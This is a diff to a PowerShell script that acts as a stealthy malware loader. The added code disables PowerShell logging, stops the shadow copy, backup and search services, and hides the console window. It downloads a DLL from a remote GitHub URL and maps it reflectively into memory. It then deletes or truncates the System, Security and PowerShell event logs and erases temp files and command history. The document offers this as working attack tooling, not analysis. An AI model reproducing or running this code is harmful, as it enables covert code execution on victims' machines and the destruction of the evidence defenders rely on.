@@ -1,3 +1,41 @@
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null
+
+Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
+Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
+Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
+Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
+
+$regCommand1 = "reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' /v EnableModuleLogging /t REG_DWORD /d 0 /f"
+$regCommand2 = "reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f"
+$regCommand3 = "reg add 'HKLM\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging' /v EnableModuleLogging /t REG_DWORD /d 0 /f"
+$regCommand4 = "reg add 'HKLM\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f"
+
+Invoke-Expression $regCommand1 | Out-Null
+Invoke-Expression $regCommand2 | Out-Null
+Invoke-Expression $regCommand3 | Out-Null
+Invoke-Expression $regCommand4 | Out-Null
+
+Get-ChildItem -Path $env:TEMP -Filter "*.cs"  -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.ps1" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+
+Set-StrictMode -Version Latest
+
+$VerbosePreference      = 'SilentlyContinue'
+$DebugPreference        = 'SilentlyContinue'
+$InformationPreference  = 'SilentlyContinue'
+$WarningPreference      = 'SilentlyContinue'
+$ErrorActionPreference  = 'SilentlyContinue'
+$ConfirmPreference      = 'None'
+$WhatIfPreference       = $false
+$PSModuleAutoLoadingPreference = 'None'
+$MaximumHistoryCount    = 0
+
+*> $null
+$Error.Clear()
+
 if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))) {
     return
 }
@@ -8,9 +46,227 @@ Add-Type -Name Window -Namespace Console -MemberDefinition @'
 '@ -ErrorAction SilentlyContinue
 [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)
 
-$ErrorActionPreference = 'SilentlyContinue'
+function Invoke-Finalize {
+    try {
+        Get-Variable -Scope Script -ErrorAction SilentlyContinue |
+            Remove-Variable -Scope Script -Force -ErrorAction SilentlyContinue
+        Get-Variable | Where-Object {
+            $_.Name -notmatch '^(PS|ExecutionContext|Host|Error|MyInvocation|PID)$'
+        } | Remove-Variable -Force -ErrorAction SilentlyContinue
+        Clear-Host
+        $Error.Clear()
+        [GC]::Collect()
+        [GC]::WaitForPendingFinalizers()
+        [GC]::Collect()
+        Get-Process | ForEach-Object { $_.MinWorkingSet = $_.MinWorkingSet }
+    } catch {}
+}
+
 $ProgressPreference = 'SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# =============================================================
+#  LOG WIPER (from Form1 code, converted to static class)
+# =============================================================
+
+$logWiperCode = @'
+using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.ServiceProcess;
+using System.Threading;
+using System.Diagnostics.Eventing.Reader;
+
+public static class LogWiper
+{
+    private static readonly string[] VerifyLogs = new[]
+    {
+        "System",
+        "Windows PowerShell",
+        "Microsoft-Windows-PowerShell/Operational",
+        "Security"
+    };
+
+    private static readonly string[] EvtxFiles = new[]
+    {
+        @"C:\Windows\System32\winevt\Logs\System.evtx",
+        @"C:\Windows\System32\winevt\Logs\Windows PowerShell.evtx",
+        @"C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx",
+        @"C:\Windows\System32\winevt\Logs\Security.evtx"
+    };
+
+    private const string EventLogServiceName = "EventLog";
+    private const int MOVEFILE_DELAY_UNTIL_REBOOT = 0x4;
+
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    private static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, int dwFlags);
+
+    public static void Wipe()
+    {
+        bool serviceWasRunning = false;
+        try
+        {
+            if (!IsAdmin()) return;
+
+            serviceWasRunning = IsServiceRunning(EventLogServiceName);
+
+            if (serviceWasRunning)
+            {
+                try { StopService(EventLogServiceName, 15000); } catch { }
+                Thread.Sleep(1000);
+            }
+
+            foreach (var path in EvtxFiles)
+            {
+                try { WipeEvtxFile(path); } catch { }
+            }
+
+            if (serviceWasRunning)
+            {
+                try { StartService(EventLogServiceName, 15000); } catch { }
+                Thread.Sleep(2500);
+            }
+
+            foreach (var logName in VerifyLogs)
+            {
+                try
+                {
+                    var q = new EventLogQuery(logName, PathType.LogName);
+                    using (var reader = new EventLogReader(q))
+                    {
+                        int count = 0;
+                        EventRecord rec;
+                        while ((rec = reader.ReadEvent()) != null && count < 5)
+                        {
+                            count++;
+                            rec.Dispose();
+                        }
+                    }
+                }
+                catch { }
+            }
+        }
+        catch { }
+        finally
+        {
+            try
+            {
+                if (serviceWasRunning && !IsServiceRunning(EventLogServiceName))
+                {
+                    try { StartService(EventLogServiceName, 15000); } catch { }
+                }
+            }
+            catch { }
+        }
+    }
+
+    private static void WipeEvtxFile(string path)
+    {
+        try
+        {
+            if (!File.Exists(path)) return;
+
+            File.SetAttributes(path, FileAttributes.Normal);
+            File.Delete(path);
+            return;
+        }
+        catch { }
+
+        try
+        {
+            string renamed = path + ".re4per_" + DateTime.Now.Ticks;
+            File.Move(path, renamed);
+
+            try
+            {
+                File.SetAttributes(renamed, FileAttributes.Normal);
+                File.Delete(renamed);
+            }
+            catch { }
+            return;
+        }
+        catch { }
+
+        try
+        {
+            if (!MoveFileEx(path, null, MOVEFILE_DELAY_UNTIL_REBOOT))
+            {
+                TruncateEvtx(path);
+            }
+        }
+        catch
+        {
+            TruncateEvtx(path);
+        }
+    }
+
+    private static void TruncateEvtx(string path)
+    {
+        try
+        {
+            using (var fs = new FileStream(path, FileMode.Open, FileAccess.Write, FileShare.ReadWrite))
+            {
+                fs.SetLength(0);
+                fs.Flush();
+            }
+        }
+        catch { }
+    }
+
+    private static bool IsAdmin()
+    {
+        var id = System.Security.Principal.WindowsIdentity.GetCurrent();
+        var p = new System.Security.Principal.WindowsPrincipal(id);
+        return p.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
+    }
+
+    private static bool IsServiceRunning(string name)
+    {
+        try
+        {
+            using (var sc = new ServiceController(name))
+            {
+                return sc.Status == ServiceControllerStatus.Running;
+            }
+        }
+        catch { return false; }
+    }
+
+    private static void StopService(string name, int timeoutMs)
+    {
+        using (var sc = new ServiceController(name))
+        {
+            if (sc.Status != ServiceControllerStatus.Stopped &&
+                sc.Status != ServiceControllerStatus.StopPending)
+            {
+                sc.Stop();
+            }
+            sc.WaitForStatus(ServiceControllerStatus.Stopped, TimeSpan.FromMilliseconds(timeoutMs));
+        }
+    }
+
+    private static void StartService(string name, int timeoutMs)
+    {
+        using (var sc = new ServiceController(name))
+        {
+            if (sc.Status != ServiceControllerStatus.Running &&
+                sc.Status != ServiceControllerStatus.StartPending)
+            {
+                sc.Start();
+            }
+            sc.WaitForStatus(ServiceControllerStatus.Running, TimeSpan.FromMilliseconds(timeoutMs));
+        }
+    }
+}
+'@
+
+try {
+    Add-Type -TypeDefinition $logWiperCode -ErrorAction Stop -ReferencedAssemblies "System.ServiceProcess", "System.Core"
+} catch { }
+
+# =============================================================
+#  NATIVE MAPPER
+# =============================================================
 
 $dllUrl = "https://raw.githubusercontent.com/RE4PERxAlive/blood-x/refs/heads/main/version.dll"
 
@@ -327,10 +583,25 @@ public static class NativeLoader
 }
 '@
 
-Add-Type -TypeDefinition $loaderCode -ErrorAction Stop
+try {
+    Add-Type -TypeDefinition $loaderCode -ErrorAction Stop
+} catch {
+    Invoke-Finalize
+    return
+}
 
 $bytes = (New-Object System.Net.WebClient).DownloadData($dllUrl)
 [NativeLoader]::Map($bytes, $true)
+
+# =============================================================
+#  WIPE EVENT LOGS — LAST STEP (after map)
+# =============================================================
+
+try { [LogWiper]::Wipe() } catch { }
+
+# =============================================================
+#  CLEANUP
+# =============================================================
 
 Get-ChildItem -Path $env:TEMP -Filter "*.cs"  -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
 Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
@@ -340,6 +611,7 @@ Get-ChildItem -Path $env:TEMP -Filter "*.ps1" -File | Where-Object { $_.Creation
 
 $bytes = $null
 $loaderCode = $null
+$logWiperCode = $null
 [GC]::Collect()
 [GC]::WaitForPendingFinalizers()
 
@@ -347,3 +619,5 @@ $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost
 if (Test-Path $historyPath) {
     Clear-Content -Path $historyPath -ErrorAction SilentlyContinue
 }
+
+Invoke-Finalize
